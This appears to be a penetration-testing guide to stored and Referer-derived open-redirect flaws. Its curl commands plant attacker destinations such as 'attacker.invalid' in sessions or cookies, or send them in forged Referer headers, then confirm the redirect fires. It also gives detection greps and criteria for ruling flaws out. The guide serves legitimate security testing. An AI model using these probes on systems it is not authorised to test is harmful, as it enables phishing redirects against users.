# Stored and Referer-derived redirects — the two-step and header surfaces

## The stored-redirect surface — the two-step

```text
step 1: a param sets the return destination:
        /set-next?next=https://evil.com  OR  /form (POST redirect=...)
        -> stored in a session / a cookie / a hidden field
step 2: a later flow reads it:
        /login -> 302 Location: <the-stored-next> -> evil.com
```

A stored redirect is a two-step surface — the param is set on one endpoint
and fires on another; a single-endpoint sweep misses it.

```bash
# step 1 — plant the destination
curl -s -c c.txt -b c.txt "$BASE/set-next?next=https://attacker.invalid"
# step 2 — trigger the flow
curl -si -c c.txt -b c.txt "$BASE/login" -d 'user=a&pass=a' | grep -i '^location'
# Location: https://attacker.invalid  <- the stored value fired
```

## The stored carriers — where the `next` lives

| The carrier | The set | The fire |
|---|---|---|
| a session field | `/set-next`/`?next=` stored server-side | the next flow reads `session['next']` |
| a cookie | `Set-Cookie: next=...` | the flow reads the cookie |
| a hidden form field | a `<input type=hidden name=redirect value=...>` | the form's POST carries it |
| a localStorage | JS `localStorage.next` | the client-side JS reads it |

## The Referer-derived surface — the header trick

```text
/back /return /previous — a flow that 302s to the Referer header
send: Referer: https://evil.com -> Location: https://evil.com
```

```bash
curl -si -H "Referer: https://attacker.invalid" "$BASE/back" | grep -i '^location'
# Location: https://attacker.invalid  <- the Referer fired
```

The Referer-derived redirect trusts the client-supplied Referer — an
attacker-controlled header. The common shape: a `redirect_back`/`return`
flow reading `request.referrer` / `request.headers['Referer']`.

## The history.back() / document.referrer — the client-side Referer

```javascript
// the client-side twin — a JS back-redirect
history.back();                       // <- the browser's history — not controllable
location.href = document.referrer;    // <- the Referer via document.referrer
```

`history.back()` reads the browser history (not controllable by the
attacker's request); `document.referrer` reads the Referer (controllable
if the attacker can set the referring page).

## The stored-redirect detection

```bash
# look for a set-then-fire pair — a param that persists
curl -s "$BASE/" | grep -iE 'redirect|next|return'    # the set-form
# the bundle-side — a localStorage/sessionStorage redirect
curl -s "$BASE/app.js" | grep -oE '(localStorage|sessionStorage)\.[a-zA-Z_]+\s*=\s*[^;]*redirect|redirect.*localStorage'
```

## The two-step detection — the set-then-fire pair

```bash
# the set
curl -s -c c.txt "$BASE/register?return_to=https://attacker.invalid"
# the fire — a LATER request reads it
curl -si -b c.txt "$BASE/login" | grep -i '^location'
```

## The Referer-check falsifier

```text
the flow reads the Referer BUT validates it:
  Referer: https://evil.com -> Location: /default   <- Referer checked
  Referer: https://evil.com -> 200 (no redirect)    <- Referer not read
```

A Referer-derived surface that validates the Referer or doesn't read it
is a negative — the header-trick is closed.

## The stored-redirect falsifier

```text
the set stores the param, but the flow validates WHEN READING:
  /set-next?next=https://evil.com -> stored
  /login -> Location: /           <- the stored value re-validated
```

A stored redirect re-validated at read-time is a negative — the two-step
surface is closed even though the param was stored.

## The stored/Referer evidence

```text
confirm: stored open-redirect
set:     /set-next?next=https://attacker.invalid  (session/cookie)
fire:    /login -> Location: https://attacker.invalid (verbatim)
```

```text
confirm: Referer-derived open-redirect
request: Referer: https://attacker.invalid -> GET /back
response: Location: https://attacker.invalid (verbatim)
```
